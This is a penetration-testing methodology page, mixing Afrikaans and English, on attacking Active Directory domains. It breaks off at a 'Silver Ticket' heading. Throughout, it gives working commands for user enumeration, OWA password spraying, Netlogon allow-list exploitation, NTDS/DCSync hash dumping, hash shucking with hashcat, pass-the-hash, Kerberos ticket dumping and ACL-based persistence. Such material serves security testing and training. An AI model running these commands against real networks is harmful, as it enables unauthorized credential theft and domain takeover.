# Active Directory Methodology

{{#include ../../banners/hacktricks-training.md}}

## Basiese oorsig

**Active Directory** dien as ’n fundamentele tegnologie, wat **netwerkadministrateurs** in staat stel om **domains**, **users**, en **objects** binne ’n netwerk doeltreffend te skep en te bestuur. Dit is ontwerp om te skaal, en maak dit moontlik om ’n groot aantal users in hanteerbare **groups** en **subgroups** te organiseer, terwyl **access rights** op verskeie vlakke beheer word.

Die struktuur van **Active Directory** bestaan uit drie primêre lae: **domains**, **trees**, en **forests**. ’n **domain** omvat ’n versameling objects, soos **users** of **devices**, wat ’n gemeenskaplike databasis deel. **Trees** is groepe van hierdie domains wat deur ’n gedeelde struktuur verbind word, en ’n **forest** verteenwoordig die versameling van verskeie trees, onderling verbind deur **trust relationships**, wat die boonste laag van die organisatoriese struktuur vorm. Spesifieke **access**- en **communication rights** kan op elkeen van hierdie vlakke toegewys word.

Belangrike konsepte binne **Active Directory** sluit in:

1. **Directory** – Bevat alle inligting wat met Active Directory objects verband hou.
2. **Object** – Dui entiteite binne die directory aan, insluitend **users**, **groups**, of **shared folders**.
3. **Domain** – Dien as ’n houer vir directory objects, met die vermoë dat verskeie domains in ’n **forest** kan saam bestaan, elk met sy eie object-versameling.
4. **Tree** – ’n Groepering van domains wat ’n gemeenskaplike root domain deel.
5. **Forest** – Die hoogtepunt van organisatoriese struktuur in Active Directory, saamgestel uit verskeie trees met **trust relationships** tussen hulle.

**Active Directory Domain Services (AD DS)** omvat ’n reeks services wat krities is vir gesentraliseerde bestuur en kommunikasie binne ’n netwerk. Hierdie services sluit in:

1. **Domain Services** – Sentraliseer data-opberging en bestuur interaksies tussen **users** en **domains**, insluitend **authentication**- en **search**-funksionaliteit.
2. **Certificate Services** – Hou toesig oor die skepping, verspreiding en bestuur van veilige **digital certificates**.
3. **Lightweight Directory Services** – Ondersteun directory-enabled applications deur die **LDAP protocol**.
4. **Directory Federation Services** – Verskaf **single-sign-on**-vermoëns om users oor verskeie web applications in ’n enkele sessie te autentiseer.
5. **Rights Management** – Help om kopieregmateriaal te beskerm deur die ongemagtigde verspreiding en gebruik daarvan te reguleer.
6. **DNS Service** – Krities vir die resolusie van **domain names**.

Vir ’n meer gedetailleerde verduideliking, kyk: [**TechTerms - Active Directory Definition**](https://techterms.com/definition/active_directory)

### **Kerberos Authentication**

Om te leer hoe om ’n **AD** aan te val, moet jy die **Kerberos authentication process** baie goed **verstaan**.\
[**Lees hierdie bladsy as jy nog nie weet hoe dit werk nie.**](kerberos-authentication.md)

## Cheat Sheet

Jy kan baie neem van [https://wadcoms.github.io/](https://wadcoms.github.io) om ’n vinnige oorsig te kry van watter commands jy kan uitvoer om ’n AD te enumerate/exploit.

> [!WARNING]
> Kerberos communication **vereis ’n fully qualified name (FQDN)** om aksies uit te voer. As jy probeer om ’n machine via die IP address te benader, **sal dit NTLM gebruik en nie kerberos nie**.

## Recon Active Directory (No creds/sessions)

As jy net toegang tot ’n AD environment het maar jy het geen credentials/sessions nie, kan jy:

- **Pentest the network:**
- Skandeer die network, vind machines en oop ports en probeer om **vulnerabilities te exploit** of **credentials** daaruit te onttrek (byvoorbeeld, [printers could be very interesting targets](ad-information-in-printers.md).
- Die enummering van DNS kan inligting gee oor sleutel servers in die domain soos web, printers, shares, vpn, media, ens.
- `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
- Kyk na die algemene [**Pentesting Methodology**](../../generic-methodologies-and-resources/pentesting-methodology.md) vir meer inligting oor hoe om dit te doen.
- **Check for null and Guest access on smb services** (dit sal nie op moderne Windows weergawes werk nie):
- `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
- `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
- `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
- ’n Meer gedetailleerde gids oor hoe om ’n SMB server te enumerate, kan hier gevind word:


{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **Enumerate Ldap**
- `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
- ’n Meer gedetailleerde gids oor hoe om LDAP te enumerate kan hier gevind word (gee **spesiale aandag aan die anonymous access**):


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **Poison the network**
- Versamel credentials deur [**services te impersonate met Responder**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
- Kry toegang tot host deur [**die relay attack te abuse**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)
- Versamel credentials deur [**fake UPnP services met evil-SDP te expose**](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)[**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856)
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html):
- Onttrek usernames/names uit interne documents, social media, services (hoofsaaklik web) binne die domain environments en ook uit die publiek beskikbare inligting.
- As jy die volledige names van company workers vind, kan jy verskillende AD **username conventions (**[**lees hierdie**](https://activedirectorypro.com/active-directory-user-naming-convention/)). Die algemeenste conventions is: _NameSurname_, _Name.Surname_, _NamSur_ (3letters van elkeen), _Nam.Sur_, _NSurname_, _N.Surname_, _SurnameName_, _Surname.Name_, _SurnameN_, _Surname.N_, 3 _random letters and 3 random numbers_ (abc123).
- Tools:
- [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
- [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### User enumeration

- **Anonymous SMB/LDAP enum:** Kyk na die [**pentesting SMB**](../../network-services-pentesting/pentesting-smb/index.html) en [**pentesting LDAP**](../../network-services-pentesting/pentesting-ldap.md) bladsye.
- **Kerbrute enum**: Wanneer ’n **ongeldige username aangevra word**, sal die server reageer met die **Kerberos error** kode _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_, wat ons in staat stel om te bepaal dat die username ongeldig was. **Geldige usernames** sal óf die **TGT in a AS-REP** response oplewer óf die error _KRB5KDC_ERR_PREAUTH_REQUIRED_, wat aandui dat die user pre-authentication moet uitvoer.
- **No Authentication against MS-NRPC**: Gebruik auth-level = 1 (No authentication) teen die MS-NRPC (Netlogon) interface op domain controllers. Die method noem die `DsrGetDcNameEx2` function nadat die MS-NRPC interface gebind is om te kyk of die user of computer bestaan sonder enige credentials. Die [NauthNRPC](https://github.com/sud0Ru/NauthNRPC) tool implementeer hierdie tipe enummering. Die navorsing kan [hier](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf) gevind word
```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```
- **OWA (Outlook Web Access) Server**

As jy een van hierdie bedieners in die netwerk gevind het, kan jy ook **user enumeration** daarteen uitvoer. Byvoorbeeld, jy kan die tool [**MailSniper**](https://github.com/dafthack/MailSniper) gebruik:
```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```
> [!WARNING]
> You can find lists of usernames in [**this github repo**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names)  and this one ([**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames)).
>
> However, you should have the **name of the people working on the company** from the recon step you should have performed before this. With the name and surname you could used the script [**namemash.py**](https://gist.github.com/superkojiman/11076951) to generate potential valid usernames.

### Netlogon vulnerable-channel allow-list abuse (Onelogon)

Even after **Zerologon** is patched on the DC, explicitly allow-listed accounts can still be exposed to **legacy/vulnerable Netlogon secure-channel behavior**. The risky configuration is the GPO **`Domain controller: Allow vulnerable Netlogon secure channel connections`** or the matching registry value **`HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\VulnerableChannelAllowList`**.

That value is an **SDDL security descriptor** (see [Security Descriptors](security-descriptors.md)). Any account or group granted the relevant ACE in the DACL can be targeted. For example, `O:BAG:BAD:(A;;RC;;;WD)` effectively allow-lists **Everyone**.

Practical operator workflow:

1. **Identify allow-listed principals** by checking both **SYSVOL/GPO** and the **live DC registry**.
2. **Resolve SIDs** found in the SDDL to real AD users/computers and prioritize **DC machine accounts**, **trust accounts**, and other privileged machines.
3. Repeatedly attempt **MS-NRPC / Netlogon authentication** as the allow-listed account.
4. After a successful guess, abuse **Netlogon password-setting** to reset the target account password (the public PoC sets it to an empty string).

Quick triage / lab examples from the public artifact:
```bash
# Enumerate allow-listed accounts (scanner requires privileged registry access on the DC)
poetry run scan --dc-ip <DC_IP> --username <USER> --password <PASSWORD>

# Meet-in-the-middle attack against an allow-listed account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>'

# Faster 24-bit brute force when you control another computer account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>' \
--comp-username '<COMP_ACCOUNT>' --comp-pass '<COMP_PASSWORD>'
```
Notes:

- Die **scanner** is nuttig omdat die effektiewe allow-list in **SYSVOL**, in die **registry**, of in albei kan bestaan.
- Die exploit pad self is belangrik omdat dit **nie Domain Admin privileges vereis nie** sodra ’n kwesbare rekening geïdentifiseer is.
- Die kompromittering van ’n **Domain Controller machine account** soos `DC$` is veral gevaarlik omdat die herstel van daardie wagwoord direk breër **AD takeover** paaie kan moontlik maak.
- **Brute-force feasibility** hang af van die modus: die openbare artifact beskryf ’n meet-in-the-middle benadering, ’n **24-bit** brute force wanneer ’n ander computer account beskikbaar is, en stadiger **32-bit** variante.

Detection / hardening notes:

- Oudit die allow-list policy en verwyder enigiets behalwe tydelike, uitdruklik vereiste compatibility exceptions.
- Monitor DC **System** events **5827/5828/5829/5830/5831** om kwesbare Netlogon connections wat geweier, ontdek, of uitdruklik deur policy toegelaat word, op te spoor.
- Behandel accounts in `VulnerableChannelAllowList` as **high-risk** totdat die legacy dependency verwyder is.

### Knowing one or several usernames

Ok, so you know you have already a valid username but no passwords... Then try:

- [**ASREPRoast**](asreproast.md): If a user **doesn't have** the attribute _DONT_REQ_PREAUTH_ you can **request a AS_REP message** for that user that will contain some data encrypted by a derivation of the password of the user.
- [**Password Spraying**](password-spraying.md): Let's try the most **common passwords** with each of the discovered users, maybe some user is using a bad password (keep in mind the password policy!).
- Note that you can also **spray OWA servers** to try to get access to the users mail servers.


{{#ref}}
password-spraying.md
{{#endref}}

### LLMNR/NBT-NS Poisoning

You might be able to **obtain** some challenge **hashes** to crack **poisoning** some protocols of the **network**:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

If you have managed to enumerate the active directory you will have **more emails and a better understanding of the network**. You might be able to to force NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)  to get access to the AD env.

### NetExec workspace-driven recon & relay posture checks

- Use **`nxcdb` workspaces** to keep AD recon state per engagement: `workspace create <name>` spawns per-protocol SQLite DBs under `~/.nxc/workspaces/<name>` (smb/mssql/winrm/ldap/etc). Switch views with `proto smb|mssql|winrm` and list gathered secrets with `creds`. Manually purge sensitive data when done: `rm -rf ~/.nxc/workspaces/<name>`.
- Quick subnet discovery with **`netexec smb <cidr>`** surfaces **domain**, **OS build**, **SMB signing requirements**, and **Null Auth**. Members showing `(signing:False)` are **relay-prone**, while DCs often require signing.
- Generate **hostnames in /etc/hosts** straight from NetExec output to ease targeting:
```bash
netexec smb 10.2.10.0/24 --generate-hosts-file hosts
cat hosts /etc/hosts | sponge /etc/hosts
```
- Wanneer **SMB relay na die DC geblokkeer is** deur signing, toets steeds **LDAP** posture: `netexec ldap <dc>` lig `(signing:None)` / swak channel binding uit. ’n DC met SMB signing required maar LDAP signing disabled bly ’n haalbare **relay-to-LDAP** teiken vir abuses soos **SPN-less RBCD**.

### Client-side printer credential leaks → bulk domain credential validation

- Printer/web UIs **embed soms gemaskeerde admin passwords in HTML**. Om source/devtools te view kan cleartext openbaar (bv. `<input value="<password>">`), wat Basic-auth access toelaat om scan/print repositories te kry.
- Retrieved print jobs kan **plaintext onboarding docs** met per-user passwords bevat. Hou pairings aligned wanneer jy toets:
```bash
cat IT_Procedures.txt | grep Username: | cut -d' ' -f2 > usernames
cat IT_Procedures.txt | grep Password: | cut -d' ' -f3 > passwords
netexec smb <dc> -u usernames -p passwords --no-bruteforce --continue-on-success
```
### Steal NTLM Creds

If you can **access other PCs or shares** with the **null or guest user** you could **place files** (like a SCF file) that if somehow accessed will t**rigger an NTLM authentication against you** so you can **steal** the **NTLM challenge** to crack it:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### Hash Shucking & NT-Candidate Attacks

**Hash shucking** treats every NT hash you already possess as a candidate password for other, slower formats whose key material is derived directly from the NT hash. Instead of brute-forcing long passphrases in Kerberos RC4 tickets, NetNTLM challenges, or cached credentials, you feed the NT hashes into Hashcat’s NT-candidate modes and let it validate password reuse without ever learning the plaintext. This is especially potent after a domain compromise where you can harvest thousands of current and historical NT hashes.

Use shucking when:

- You have an NT corpus from DCSync, SAM/SECURITY dumps, or credential vaults and need to test for reuse in other domains/forests.
- You capture RC4-based Kerberos material (`$krb5tgs$23$`, `$krb5asrep$23$`), NetNTLM responses, or DCC/DCC2 blobs.
- You want to quickly prove reuse for long, uncrackable passphrases and immediately pivot via Pass-the-Hash.

The technique **does not work** against encryption types whose keys are not the NT hash (e.g., Kerberos etype 17/18 AES). If a domain enforces AES-only, you must revert to the regular password modes.

#### Building an NT hash corpus

- **DCSync/NTDS** – Use `secretsdump.py` with history to grab the largest possible set of NT hashes (and their previous values):

```bash
secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -user-status -outputfile smoke_dump
grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt
```

History entries dramatically widen the candidate pool because Microsoft can store up to 24 previous hashes per account. For more ways to harvest NTDS secrets see:

{{#ref}}
dcsync.md
{{#endref}}

- **Endpoint cache dumps** – `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa` (or Mimikatz `lsadump::sam /patch`) extracts local SAM/SECURITY data and cached domain logons (DCC/DCC2). Deduplicate and append those hashes to the same `nt_candidates.txt` list.
- **Track metadata** – Keep the username/domain that produced each hash (even if the wordlist contains only hex). Matching hashes tell you immediately which principal is reusing a password once Hashcat prints the winning candidate.
- Prefer candidates from the same forest or a trusted forest; that maximizes the chance of overlap when shucking.

#### Hashcat NT-candidate modes

| Hash Type                                | Password Mode | NT-Candidate Mode |
| ---------------------------------------- | ------------- | ----------------- |
| Domain Cached Credentials (DCC)          | 1100          | 31500             |
| Domain Cached Credentials 2 (DCC2)       | 2100          | 31600             |
| NetNTLMv1 / NetNTLMv1+ESS                | 5500          | 27000             |
| NetNTLMv2                                | 5600          | 27100             |
| Kerberos 5 etype 23 AS-REQ Pre-Auth      | 7500          | _N/A_             |
| Kerberos 5 etype 23 TGS-REP (Kerberoast) | 13100         | 35300             |
| Kerberos 5 etype 23 AS-REP               | 18200         | 35400             |

Notes:

- NT-candidate inputs **must remain raw 32-hex NT hashes**. Disable rule engines (no `-r`, no hybrid modes) because mangling corrupts the candidate key material.
- These modes are not inherently faster, but the NTLM keyspace (~30,000 MH/s on an M3 Max) is ~100× quicker than Kerberos RC4 (~300 MH/s). Testing a curated NT list is far cheaper than exploring the entire password space in the slow format.
- Always run the **latest Hashcat build** (`git clone https://github.com/hashcat/hashcat && make install`) because modes 31500/31600/35300/35400 shipped recently.
- There is currently no NT mode for AS-REQ Pre-Auth, and AES etypes (19600/19700) require the plaintext password because their keys are derived via PBKDF2 from UTF-16LE passwords, not raw NT hashes.

#### Example – Kerberoast RC4 (mode 35300)

1. Capture an RC4 TGS for a target SPN with a low-privileged user (see the Kerberoast page for details):

{{#ref}}
kerberoast.md
{{#endref}}

```bash
GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile roastable_TGS
```

2. Shuck the ticket with your NT list:

```bash
hashcat -m 35300 roastable_TGS nt_candidates.txt
```

Hashcat derives the RC4 key from each NT candidate and validates the `$krb5tgs$23$...` blob. A match confirms that the service account uses one of your existing NT hashes.

3. Immediately pivot via PtH:

```bash
nxc smb <dc_ip> -u roastable -H <matched_nt_hash>
```

You can optionally recover the plaintext later with `hashcat -m 1000 <matched_hash> wordlists/` if needed.

#### Example – Cached credentials (mode 31600)

1. Dump cached logons from a compromised workstation:

```bash
nxc smb <host_ip> -u localadmin -p '<password>' --local-auth --lsa > lsa_dump.txt
```

2. Copy the DCC2 line for the interesting domain user into `dcc2_highpriv.txt` and shuck it:

```bash
hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
```

3. A successful match yields the NT hash already known in your list, proving that the cached user is reusing a password. Use it directly for PtH (`nxc smb <dc_ip> -u highpriv -H <hash>`) or brute-force it in fast NTLM mode to recover the string.

The exact same workflow applies to NetNTLM challenge-responses (`-m 27000/27100`) and DCC (`-m 31500`). Once a match is identified you can launch relay, SMB/WMI/WinRM PtH, or re-crack the NT hash with masks/rules offline.



## Enumerating Active Directory WITH credentials/session

For this phase you need to have **compromised the credentials or a session of a valid domain account.** If you have some valid credentials or a shell as a domain user, **you should remember that the options given before are still options to compromise other users**.

Before start the authenticated enumeration you should know what is the **Kerberos double hop problem.**


{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### Enumeration

Having compromised an account is a **big step to start compromising the whole domain**, because you are going to be able to start the **Active Directory Enumeration:**

Regarding [**ASREPRoast**](asreproast.md) you can now find every possible vulnerable user, and regarding [**Password Spraying**](password-spraying.md) you can get a **list of all the usernames** and try the password of the compromised account, empty passwords and new promising passwords.

- You could use the [**CMD to perform a basic recon**](../basic-cmd-for-pentesters.md#domain-info)
- You can also use [**powershell for recon**](../basic-powershell-for-pentesters/index.html) which will be stealthier
- You can also [**use powerview**](../basic-powershell-for-pentesters/powerview.md) to extract more detailed information
- Another amazing tool for recon in an active directory is [**BloodHound**](bloodhound.md). It is **not very stealthy** (depending on the collection methods you use), but **if you don't care** about that, you should totally give it a try. Find where users can RDP, find path to other groups, etc.
- **Other automated AD enumeration tools are:** [**AD Explorer**](bloodhound.md#ad-explorer)**,** [**ADRecon**](bloodhound.md#adrecon)**,** [**Group3r**](bloodhound.md#group3r)**,** [**PingCastle**](bloodhound.md#pingcastle)**.**
- [**DNS records of the AD**](ad-dns-records.md) as they might contain interesting information.
- A **tool with GUI** that you can use to enumerate the directory is **AdExplorer.exe** from **SysInternal** Suite.
- You can also search in the LDAP database with **ldapsearch** to look for credentials in fields _userPassword_ & _unixUserPassword_, or even for _Description_. cf. [Password in AD User comment on PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment) for other methods.
- If you are using **Linux**, you could also enumerate the domain using [**pywerview**](https://github.com/the-useless-one/pywerview).
- You could also try automated tools as:
- [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
- [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **Extracting all domain users**

It's very easy to obtain all the domain usernames from Windows (`net user /domain` ,`Get-DomainUser` or `wmic useraccount get name,sid`). In Linux, you can use: `GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` or `enum4linux -a -u "user" -p "password" <DC IP>`

> Even if this Enumeration section looks small this is the most important part of all. Access the links (mainly the one of cmd, powershell, powerview and BloodHound), learn how to enumerate a domain and practice until you feel comfortable. During an assessment, this will be the key moment to find your way to DA or to decide that nothing can be done.

### Kerberoast

Kerberoasting involves obtaining **TGS tickets** used by services tied to user accounts and cracking their encryption—which is based on user passwords—**offline**.

More about this in:


{{#ref}}
kerberoast.md
{{#endref}}

### Remote connexion (RDP, SSH, FTP, Win-RM, etc)

Once you have obtained some credentials you could check if you have access to any **machine**. For that matter, you could use **CrackMapExec** to attempt connecting on several servers with different protocols, accordingly to your ports scans.

### Local Privilege Escalation

If you have compromised credentials or a session as a regular domain user and you have **access** with this user to **any machine in the domain** you should try to find your way to **escalate privileges locally and looting for credentials**. This is because only with local administrator privileges you will be able to **dump hashes of other users** in memory (LSASS) and locally (SAM).

There is a complete page in this book about [**local privilege escalation in Windows**](../windows-local-privilege-escalation/index.html) and a [**checklist**](../checklist-windows-privilege-escalation.md). Also, don't forget to use [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite).

### Current Session Tickets

It's very **unlikely** that you will find **tickets** in the current user **giving you permission to access** unexpected resources, but you could check:
```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```
### NTLM Relay

As jy daarin geslaag het om die active directory te enumereer, sal jy **meer e-posse en ’n beter begrip van die netwerk** hê. Jy kan dalk NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) **afdwing**.**

### Looks for Creds in Computer Shares | SMB Shares

Nou dat jy ’n paar basiese credentials het, moet jy kyk of jy enige **interessante lêers wat binne die AD gedeel word, kan vind**. Jy kan dit handmatig doen, maar dit is ’n baie vervelige, herhalende taak (en nog meer as jy honderde docs vind wat jy moet nagaan).

[**Volg hierdie skakel om van tools te leer wat jy kan gebruik.**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### Steal NTLM Creds

As jy toegang tot ander PCs of shares kan kry, kan jy **lêers plaas** (soos ’n SCF file) wat, as dit op een of ander manier verkry word, ’n **NTLM authentication teen jou sal trigger** sodat jy die **NTLM challenge** kan **steel** om dit te crack:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

Hierdie vulnerability het enige authenticated user toegelaat om die **domain controller te compromise**.


{{#ref}}
printnightmare.md
{{#endref}}

## Privilege escalation on Active Directory WITH privileged credentials/session

**Vir die volgende techniques is ’n gewone domain user nie genoeg nie; jy benodig spesiale privileges/credentials om hierdie attacks uit te voer.**

### Hash extraction

Hopelik het jy daarin geslaag om ’n **local admin** account te compromise met [AsRepRoast](asreproast.md), [Password Spraying](password-spraying.md), [Kerberoast](kerberoast.md), [Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md) insluitend relaying, [EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md), [escalating privileges locally](../windows-local-privilege-escalation/index.html).\
Dan is dit tyd om al die hashes in memory en plaaslik te dump.\
[**Lees hierdie bladsy oor verskillende maniere om die hashes te verkry.**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**Sodra jy die hash van ’n user het**, kan jy dit gebruik om hom te **impersonate**.\
Jy moet ’n **tool** gebruik wat die **NTLM authentication using** daardie **hash** sal **perform**, **of** jy kan ’n nuwe **sessionlogon** skep en daardie **hash** binne die **LSASS** **inject**, sodat wanneer enige **NTLM authentication** uitgevoer word, daardie **hash** gebruik sal word. Die laaste opsie is wat mimikatz doen.\
[**Lees hierdie bladsy vir meer inligting.**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

Hierdie attack poog om die user NTLM hash te gebruik om Kerberos tickets aan te vra, as ’n alternatief tot die algemene Pass The Hash oor NTLM protocol. Daarom kan dit veral **nuttig wees in netwerke waar NTLM protocol gedeaktiveer is** en slegs **Kerberos toegelaat word** as authentication protocol.


{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

In die **Pass The Ticket (PTT)** attack method, steel attackers ’n user se authentication ticket in plaas van hul password of hash values. Hierdie gesteelde ticket word dan gebruik om die user te **impersonate**, en kry ongemagtigde toegang tot resources en services binne ’n network.


{{#ref}}
pass-the-ticket.md
{{#endref}}

### Credentials Reuse

As jy die **hash** of **password** van ’n **local administrator** het, moet jy probeer om daarmee **plaaslik by ander PCs in te log**.
```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
> [!WARNING]
> Let op dat dit nogal **noisy** is en **LAPS** dit sou **mitigeer**.

### MSSQL Abuse & Trusted Links

If a user has privileges to **access MSSQL instances**, he could be able to use it to **execute commands** in the MSSQL host (if running as SA), **steal** the NetNTLM **hash** or even perform a **relay** **attack**.\
Also, if a MSSQL instance is trusted (database link) by a different MSSQL instance. If the user has privileges over the trusted database, he is going to be able to **use the trust relationship to execute queries also in the other instance**. These trusts can be chained and at some point the user might be able to find a misconfigured database where he can execute commands.\
**The links between databases work even across forest trusts.**


{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### IT asset/deployment platforms abuse

Third-party inventory and deployment suites often expose powerful paths to credentials and code execution. See:

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Unconstrained Delegation

If you find any Computer object with the attribute [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) and you have domain privileges in the computer, you will be able to dump TGTs from memory of every users that logins onto the computer.\
So, if a **Domain Admin logins onto the computer**, you will be able to dump his TGT and impersonate him using [Pass the Ticket](pass-the-ticket.md).\
Thanks to constrained delegation you could even **automatically compromise a Print Server** (hopefully it will be a DC).


{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Constrained Delegation

If a user or computer is allowed for "Constrained Delegation" it will be able to **impersonate any user to access some services in a computer**.\
Then, if you **compromise the hash** of this user/computer you will be able to **impersonate any user** (even domain admins) to access some services.


{{#ref}}
constrained-delegation.md
{{#endref}}

### Resourced-based Constrain Delegation

Having **WRITE** privilege on an Active Directory object of a remote computer enables the attainment of code execution with **elevated privileges**:


{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### Permissions/ACLs Abuse

The compromised user could have some **interesting privileges over some domain objects** that could let you **move** laterally/**escalate** privileges.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Printer Spooler service abuse

Discovering a **Spool service listening** within the domain can be **abused** to **acquire new credentials** and **escalate privileges**.


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Third party sessions abuse

If **other users** **access** the **compromised** machine, it's possible to **gather credentials from memory** and even **inject beacons in their processes** to impersonate them.\
Usually users will access the system via RDP, so here you have how to performa couple of attacks over third party RDP sessions:


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

**LAPS** provides a system for managing the **local Administrator password** on domain-joined computers, ensuring it's **randomized**, unique, and frequently **changed**. These passwords are stored in Active Directory and access is controlled through ACLs to authorized users only. With sufficient permissions to access these passwords, pivoting to other computers becomes possible.


{{#ref}}
laps.md
{{#endref}}

### Certificate Theft

**Gathering certificates** from the compromised machine could be a way to escalate privileges inside the environment:


{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### Certificate Templates Abuse

If **vulnerable templates** are configured it's possible to abuse them to escalate privileges:


{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}}

## Post-exploitation with high privilege account

### Dumping Domain Credentials

Once you get **Domain Admin** or even better **Enterprise Admin** privileges, you can **dump** the **domain database**: _ntds.dit_.

[**More information about DCSync attack can be found here**](dcsync.md).

[**More information about how to steal the NTDS.dit can be found here**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Privesc as Persistence

Some of the techniques discussed before can be used for persistence.\
For example you could:

- Make users vulnerable to [**Kerberoast**](kerberoast.md)

```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
```

- Make users vulnerable to [**ASREPRoast**](asreproast.md)

```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

- Grant [**DCSync**](#dcsync) privileges to a user

```bash
Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
```

### Silver Ticket

